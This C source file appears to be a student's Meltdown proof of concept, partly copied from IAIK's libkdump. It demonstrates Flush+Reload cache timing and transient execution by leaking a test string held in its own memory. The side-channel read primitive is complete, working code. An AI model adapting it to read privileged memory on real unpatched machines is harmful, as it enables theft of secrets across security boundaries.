#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>
#include <cpuid.h>
#include <errno.h>
#include <fcntl.h>
#include <memory.h>
#include <pthread.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdlib.h>

// ==========================================================================================
// copied from meltdown https://github.com/IAIK/meltdown/blob/master/libkdump/libkdump.c
// low level asm functions and some important functions
// modified to make it more clear
static jmp_buf buf;
uint64_t cache_miss_threshold;

static inline void maccess(void *p)
{
    asm volatile("movq (%0), %%rax\n"
                 :
                 : "c"(p)
                 : "rax");
}

static void flush(void *p)
{
    asm volatile("clflush 0(%0)\n"
                 :
                 : "c"(p)
                 : "rax");
}

static inline uint64_t rdtsc()
{
    uint64_t a = 0, d = 0;
    asm volatile("mfence");
    asm volatile("rdtsc"
                 : "=a"(a), "=d"(d));
    a = (d << 32) | a;
    asm volatile("mfence");
    return a;
}

static int inline flush_reload(void *ptr)
{
    uint64_t start = 0, end = 0;

    start = rdtsc();
    maccess(ptr);
    end = rdtsc();

    flush(ptr);

    if (end - start < cache_miss_threshold)
    {
        return 1;
    }
    return 0;
}

static uint64_t inline flush_reload_time(void *ptr)
{
    uint64_t start = 0, end = 0;

    start = rdtsc();
    maccess(ptr);
    end = rdtsc();

    flush(ptr);

    return end - start;
}


static void detect_flush_reload_threshold()
{
    size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
    size_t dummy[16];
    size_t *ptr = dummy + 8;
    uint64_t start = 0, end = 0;

    maccess(ptr);
    for (i = 0; i < count; i++)
    {
        start = rdtsc();
        maccess(ptr);
        end = rdtsc();
        reload_time += (end - start);
    }
    for (i = 0; i < count; i++)
    {
        start = rdtsc();
        maccess(ptr);
        end = rdtsc();
        flush(ptr);
        flush_reload_time += (end - start);
    }
    reload_time /= count;
    flush_reload_time /= count;

    cache_miss_threshold = (flush_reload_time + reload_time * 2) / 3;
}

static void segfault_handler(int signum)
{
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
    longjmp(buf, 1);
}


// ==========================================================================================
// main meltdown program
// some are copied from libkdump, some are wrote by myself


// predefine
typedef unsigned char byte;
int my_method = 0;
const int single_round = 100;
const double succ_rate = 0.3;
const int measures = 3;
size_t mem = 0;

// meltdown
inline byte meltdown_try_read(void *paddr)
{
    int j;

    // meltdown
    if (!setjmp(buf))
    {
        asm volatile(
            "movzx (%%rcx), %%rax\n"        // rax = *paddr
            "shl $12, %%rax\n"              // rax %= 4096
            "movq (%%rbx,%%rax,1), %%rax\n" // rax = mem[rax]
            :
            : "c"(paddr), "b"(mem)
            : "rax");
    }

    // get time and choose the fastest
    if (my_method)
    {
        uint64_t min_t = 0;
        int min_j = -1;
        for (j = 0; j < 256; j++)
        {
            uint64_t res = flush_reload_time((void*)(mem + j * 4096));
            if (min_j == -1 || res <= min_t)
            {
                min_j = j;
                min_t = res;
            }
        }
        assert(min_j >= 0 && min_j < 256);
        return min_j;
    }
    // find the one that faster than avarage time when cache hit occurs
    else
    {
        while (1)
        {
            for (j = 0; j < 256; j++)
            {
                if (flush_reload((void*)(mem + j * 4096)))
                    return j;
            }
        }
    }
}

// filter the result generated by meltdown attack to make it more reliable
byte meltdown_read(void *paddr)
{
    // init
    int count[256];
    int i, j;
    memset(count, 0, sizeof(count));

    if (my_method)
    {
        // statistics
        int result = 0;
        int acc_times = 0;
        double rate = 0;
        do
        {
            // a round
            for (j = 0; j < single_round; j++)
            {
                count[meltdown_try_read(paddr)]++;
            }
            acc_times += single_round;

            // stat
            int max_i = 0, max_c = count[0];
            for (i = 1; i < 256; i++)
            {
                if (count[i] > max_c)
                {
                    max_c = count[i];
                    max_i = i;
                }
            }
            result = max_i;
            rate = (double)max_c / (double)acc_times;
        } while (rate < succ_rate);
        return result;
    }
    else
    {
        for(i=0;i<measures;i++){
            count[meltdown_try_read(paddr)]++;
        }
        // stat
        int max_i = 0, max_c = count[0];
        for (i = 1; i < 256; i++)
        {
            if (count[i] > max_c)
            {
                max_c = count[i];
                max_i = i;
            }
        }
        return max_i;
    }
}

// ==========================================================================================
// main
// expected output:
// official method:        Hey Jude, don't be afraid. You were made to go out and get her.
// my method:              Hey Jude, don't be afraid. You were made to go out and get her.
char secret[] = "Hey Jude, don't be afraid. You were made to go out and get her.\n\0";
int main()
{
    // init
    mem = (size_t)malloc(300 * 4096);
    mem = (mem / 4096 + 1) * 4096;
    memset((void*)mem, 0xab, 4096 * 290);
    assert(signal(SIGSEGV, segfault_handler) != SIG_ERR);
    detect_flush_reload_threshold();

    // hack
    printf("official method:\t");
    char *addr = secret;
    while (1)
    {
        char ch = meltdown_read(addr++);
        if (ch == 0) break;
        else putchar(ch);
    }

    my_method = 1;
    printf("my method:\t\t");
    addr = secret;
    while (1)
    {
        char ch = meltdown_read(addr++);
        if (ch == 0) break;
        else putchar(ch);
    }
    return 0;
}